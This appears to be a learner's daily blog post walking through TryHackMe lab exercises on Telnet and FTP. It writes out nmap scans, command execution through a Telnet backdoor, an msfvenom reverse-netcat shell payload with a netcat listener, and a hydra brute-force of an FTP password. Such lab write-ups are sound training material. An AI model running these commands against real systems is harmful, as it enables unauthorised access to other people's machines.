---
title: Day 13
date: 2022-04-26
layout: post.njk
tags: daily
---

{{ page.date.toDateString }}

Today I'm starting on the Telnet section of the [Network Services Module](https://tryhackme.com/room/networkservices). I know Telnet is pretty old and not used often, but I always think knowing more is better than knowing less.


Just like I thought:
>"Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations."

I ran an Nmap scan against the target, but got no open ports up when I just ran `nmap -sS <IP>`. It ran it against the first 100 ports so I bumped it to 10000 and got one: `Port 8012`. Service is unknown.

When I telnet to it I get the message:
> "SKIDY'S BACKDOOR"
But it doesn't appear that I can run any commands.

I followed the instructions to set up the `tcpdump` on the attack box via: `sudo tcpdump ip proto \\icmp -i eth0`. This essentially is saying listen for ping requests on the eth0 interface.

I then was able to run a ping on the connected host using the `.RUN` command: `.RUN ping <ip> -c 1` and I received the ping request. This means I can execute commands on the remote system.

I then used `msfvenom` to create a specific payload to get a shell on the remote machine. `msfvenom -p cmd/unix/reverse_netcat lhost=<ip> lport=4444 R`. The payload creates a Netcat connection back to your local machine so I just needed to set up a Netcat listener locally on the port I specified in the MSFVenom command. `nc -lvp 4444`

After running that I run the payload on the remote machine and I got a connection back! a simple ls revealed `flag.txt`.

Lastly, I moved onto the FTP section. The enumeration was pretty simple I ran `nmap -sT <ip>` and it came back with two ports. There was a web server on port 80 and ftp running on 21. I ran `nmap -sV <ip> -p 21` to get more info on the FTP service. I was then able to login anonymously: `username: anonymous, password: <blank>` There was a file in there signed by Mike.

To get in I used hydra to brute force the password while guessing that there is a username `mike`. The command was: `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp`

Hydra was able to brute force the password and gave me a password of...`password`. I was then able to login via ftp using that username and password to retrieve the flag.


This was a good module and I enjoyed getting to do some exploitation. Looking forward to [Network Services 2](https://tryhackme.com/room/networkservices2) tomorrow!

